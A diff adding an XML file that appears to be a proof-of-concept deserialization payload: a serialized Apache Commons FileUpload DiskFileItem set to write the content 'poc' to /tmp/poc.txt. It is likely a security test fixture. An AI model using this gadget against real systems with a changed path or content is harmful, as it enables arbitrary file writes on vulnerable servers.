@@ -1,0 +1,15 @@
+<org.apache.commons.fileupload.disk.DiskFileItem serialization="custom">
+  <org.apache.commons.fileupload.disk.DiskFileItem>
+    <default>
+      <isFormField>false</isFormField>
+      <size>-1</size>
+      <sizeThreshold>0</sizeThreshold>
+      <cachedContent>cG9jCg==</cachedContent>
+      <tempFile>/tmp/poc.txt</tempFile>
+      <contentType>application/octet-stream</contentType>
+      <fieldName></fieldName>
+      <fileName></fileName>
+      <repository>./</repository>
+    </default>
+  </org.apache.commons.fileupload.disk.DiskFileItem>
+</org.apache.commons.fileupload.disk.DiskFileItem>
